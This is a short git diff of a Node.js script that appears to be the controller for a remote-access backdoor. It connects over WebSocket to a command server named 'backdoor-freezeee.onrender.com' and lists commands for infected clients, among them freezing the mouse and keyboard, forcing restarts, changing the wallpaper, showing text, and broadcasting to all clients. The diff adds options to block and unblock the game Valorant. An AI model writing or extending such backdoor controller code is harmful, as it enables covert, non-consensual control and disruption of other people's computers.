@@ -3,7 +3,7 @@ const readline = require("readline");
 
 const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");
 
-const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nCUI - COOK PC UI!!       BYE - Turns off a client\nT_(word)_secs - Puts a word on screen\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
+const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nBV - Block Valorant\nUV - Unblock Valorant\nCUI - COOK PC UI!!       BYE - Turns off a client\nT_(word)_secs - Puts a word on screen\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
 
 const rl = readline.createInterface({
   input: process.stdin,
